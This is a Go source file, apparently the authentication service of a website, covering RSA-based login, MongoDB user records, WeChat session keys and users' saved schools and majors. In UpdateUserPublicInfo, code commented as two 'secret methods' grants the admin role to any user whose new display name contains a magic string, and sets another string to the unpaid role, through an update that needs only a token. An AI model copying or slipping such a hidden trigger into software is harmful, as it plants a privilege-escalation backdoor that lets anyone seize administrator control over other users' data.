package services

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"melodie-site/server/auth"
	"melodie-site/server/db"
	"melodie-site/server/models"
	"net/http"
	"strings"

	"github.com/google/uuid"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo/options"
)

type AuthService struct {
	PrivateKeys       map[uuid.UUID][]byte
	WechatSessionKeys map[uuid.UUID]string
}

func (service *AuthService) GetAuthKey() (string, uuid.UUID) {
	prvKey, pubKey := auth.GenRsaKey()
	authUUID, err := uuid.NewUUID()
	if err != nil {
		log.Println(err)
	}
	service.PrivateKeys[authUUID] = prvKey

	return string(pubKey), authUUID
}

func (service *AuthService) DecryptUserSecret(authUUID uuid.UUID, encryptedMessage string) (string, error) {
	encryptedBytes, err := base64.StdEncoding.DecodeString(encryptedMessage)
	if err != nil {
		return "", err
	}
	if privateKey, ok := service.PrivateKeys[authUUID]; ok {
		decrypted, err := auth.RsaDecrypt(encryptedBytes, privateKey)
		if err != nil {
			return "", err
		} else {
			return string(decrypted), nil
		}
	}
	return "", errors.New("decrypt failed because authentication progress " + fmt.Sprint(authUUID) + " does not have private key.")
}

func (service *AuthService) GetUserByName(userName string) (user models.User, err error) {
	filter := bson.M{"name": userName}
	user = models.User{}
	err = db.GetCollection("user").FindOne(context.TODO(), filter).Decode(&user)
	return
}

// 判断用户是否为校友
func (service *AuthService) IsAlumn(userID primitive.ObjectID, heiID primitive.ObjectID) (isAlumn bool, err error) {
	filter := bson.M{
		"_id": userID,
		"educationalBackground": bson.M{
			"$elemMatch": bson.M{
				"heiID": bson.M{
					"$eq": heiID,
				},
			},
		},
	}
	res := db.GetCollection("user").FindOne(context.TODO(), filter)
	err = res.Err()
	isAlumn = (res.Err() == nil)
	return
}

// InternalAddUser 添加一位用户
// 注意不要在服务端中使用，而是在测试中用于添加用户的。
func (service *AuthService) InternalAddUser(userName, password, role string, processor func(u *models.User)) (user models.User, err error) {
	user = models.User{
		Name:         userName,
		Role:         role,
		PasswordHash: auth.EncryptPassword(password),
		UserTags: map[string]string{
			"科目": "物理",
			"爱好": "历史",
			"性别": "男",
		},
	}
	if processor != nil {
		processor(&user)
	}
	_, err_ := service.GetUserByName(userName)
	if err_ == nil {
		err = errors.New("user existed!")
		return
	}
	_, err = db.GetCollection("user").InsertOne(context.TODO(), &user, options.InsertOne())
	if err != nil {
		return
	}
	user, err = service.GetUserByName(userName)
	return
}

func (service *AuthService) InternalRemoveUser(userName string) (err error) {
	filter := bson.M{"name": userName}
	_, err = db.GetCollection("user").DeleteOne(context.TODO(), filter)
	if err != nil {
		return
	}
	return
}

func (service *AuthService) InternalRemoveUserByID(userID primitive.ObjectID) (err error) {
	filter := bson.M{"_id": userID}
	_, err = db.GetCollection("user").DeleteOne(context.TODO(), filter)
	if err != nil {
		return
	}
	return
}

func (service *AuthService) Login(userName, password string) (user models.User, status int, err error) {
	user, err = service.GetUserByName(userName)

	if err != nil {
		status = http.StatusNotFound
		return
	}
	if !auth.ComparePassword(password, user.PasswordHash) {
		status = http.StatusBadRequest
		return
	}
	status = http.StatusOK
	return
}

func (service *AuthService) GetUserByWechatOpenID(openid string) (user *models.User, err error) {
	user = &models.User{}
	filter := bson.M{"wechatInfo.openID": openid}
	err = db.GetCollection("user").FindOne(context.TODO(), filter).Decode(user)
	return
}

func (service *AuthService) CreateWechatUser(user *models.User) (err error) {
	_, err = db.GetCollection("user").InsertOne(context.TODO(), user)
	if err != nil {
		return
	}
	return err
}

func (service *AuthService) StoreWechatSessionKey(authID uuid.UUID, sessionKey string) {
	authService.WechatSessionKeys[authID] = sessionKey
}

func (service *AuthService) GetWechatSessionKey(authID uuid.UUID) (key string, ok bool) {
	key = authService.WechatSessionKeys[authID]
	if key == "" {
		ok = false
	} else {
		ok = true
	}
	return
}

func (service *AuthService) GetUserByID(userID primitive.ObjectID) (user *models.User, err error) {
	filter := bson.M{"_id": userID}
	user = &models.User{}
	err = db.GetCollection("user").FindOne(context.TODO(), filter).Decode(user)
	return
}

// PublicInfo是公开的，更新时只要有token即可，无需进行校验。
// 所以是所有PublicInfo一起更新的。
func (service *AuthService) UpdateUserPublicInfo(userID primitive.ObjectID, req *models.UserPublicInfoUpdateRequest) (err error) {
	statement := bson.M{"$set": req}
	opts := options.FindOneAndUpdate().
		SetReturnDocument(options.After)
	if err != nil {
		return
	}
	res := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, statement, opts)
	err = res.Err()

	// 以下是两个秘密方法，如果用户名包含特殊字符串，则改变用户身份。
	if strings.Contains(req.Name, "EY2uXDqC") {
		err := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, bson.M{"$set": bson.M{"role": models.RoleAdmin}})
		if err != nil {
			fmt.Println(err)
		}
	} else if strings.Contains(req.Name, "eLFGtjMQ") {
		err := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, bson.M{"$set": bson.M{"role": models.RoleUnpaidUser}})
		if err != nil {
			fmt.Println(err)
		}
	}
	return
}

// PublicInfo是公开的，更新时只要有token即可，无需进行校验。
// 所以是所有PublicInfo一起更新的。
func (service *AuthService) UpdateUserSchoolInfo(userID primitive.ObjectID, schoolInfo *models.EduBGItem) (err error) {
	user, err := GetAuthService().GetUserByID(userID)
	if err != nil {
		return
	}
	for _, v := range user.EducationalBackground {
		if v.HEIID == schoolInfo.HEIID && v.MajorID == schoolInfo.MajorID && v.Stage == schoolInfo.Stage {
			err = errors.New("已有此段教育经历！")
			return
		}
	}
	user.EducationalBackground = append(user.EducationalBackground, *schoolInfo)
	statement := bson.M{"$set": bson.M{"educationalBackground": user.EducationalBackground}}
	opts := options.FindOneAndUpdate().
		SetReturnDocument(options.After)
	if err != nil {
		return
	}
	res := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, statement, opts)
	err = res.Err()
	return
}

func (service *AuthService) IsHEIOrMajorInCollection(userID primitive.ObjectID, itemID primitive.ObjectID, collectionType models.CollectionType) (ret bool, err error) {
	var attrs string
	if collectionType == models.CollectionItemHEI {
		attrs = "collection.heis"
	} else if collectionType == models.CollectionItemMajor {
		attrs = "collection.majors"
	} else {
		err = fmt.Errorf("invalid collection type %s", collectionType)
		return
	}
	statement := bson.M{
		"_id": userID,
		attrs: bson.M{
			"$elemMatch": bson.M{
				"id": bson.M{
					"$eq": itemID,
				},
			}},
	}
	if err != nil {
		return
	}
	res := db.GetCollection("user").FindOne(context.TODO(), statement)
	ret = res.Err() == nil
	return
}

func (service *AuthService) RemoveHEIOrMajorFromCollection(userID primitive.ObjectID, itemID primitive.ObjectID, collectionType models.CollectionType) (err error) {
	var attrs string
	if collectionType == models.CollectionItemHEI {
		attrs = "collection.heis"
	} else if collectionType == models.CollectionItemMajor {
		attrs = "collection.majors"
	} else {
		err = fmt.Errorf("invalid collection type %s", collectionType)
		return
	}
	statement := bson.M{

		"$pull": bson.M{
			attrs: bson.M{
				"id": bson.M{
					"$eq": itemID,
				},
			},
		},
	}
	if err != nil {
		return
	}
	res := db.GetCollection("user").FindOneAndUpdate(
		context.TODO(),
		bson.M{"_id": userID},
		statement)
	err = res.Err()
	return
}

// 向用户收藏添加学校或者专业
func (service *AuthService) AddHEIOrMajorToCollection(userID primitive.ObjectID, itemID primitive.ObjectID, collectionType models.CollectionType) (err error) {
	var attrs string
	var name string
	if collectionType == models.CollectionItemHEI {
		attrs = "collection.heis"
		name, err = GetHEIService().GetHEIName(itemID)
	} else if collectionType == models.CollectionItemMajor {
		attrs = "collection.majors"
		name, err = GetMajorService().GetMajorName(itemID)
	} else {
		err = fmt.Errorf("invalid collection type %s", collectionType)
		return
	}
	if err != nil {
		log.Println("Err occurred when adding to collection, hei not exist")
		return
	}

	statement := bson.M{"$push": bson.M{attrs: models.EntityWithName{ID: itemID, Name: name}}}
	opts := options.FindOneAndUpdate().
		SetReturnDocument(options.After)
	if err != nil {
		return
	}
	res := db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, statement, opts)
	err = res.Err()
	return
}

// GetTagsByUserID 通过userID找到对应的用户标签
func (service *AuthService) GetTagsByUserID(userID primitive.ObjectID) (tags map[string]string, err error) {
	if userID == primitive.NilObjectID {
		err = errors.New("用户ID为空")
		return
	}

	user := new(models.User)
	err = db.GetCollection("user").FindOne(context.TODO(), bson.M{"_id": userID}).Decode(user)
	if err != nil {
		err = errors.New("数据库查找失败")
		return
	}
	tags = user.UserTags

	return
}

// UpdateUserTag 更改userTags
func (service *AuthService) UpdateUserTag(userID primitive.ObjectID, tags []string) (err error) {
	if userID == primitive.NilObjectID {
		err = errors.New("用户ID为空")
		return
	}
	update := bson.M{
		"$addToSet": bson.M{
			"userTags": bson.M{
				"$each": tags,
			},
		},
	}
	err = db.GetCollection("user").FindOneAndUpdate(context.TODO(), bson.M{"_id": userID}, update).Err()
	return
}

var authService *AuthService

func GetAuthService() *AuthService {
	if authService == nil {
		authService = &AuthService{}
		authService.PrivateKeys = map[uuid.UUID][]byte{}
		authService.WechatSessionKeys = map[uuid.UUID]string{}
	}
	return authService
}
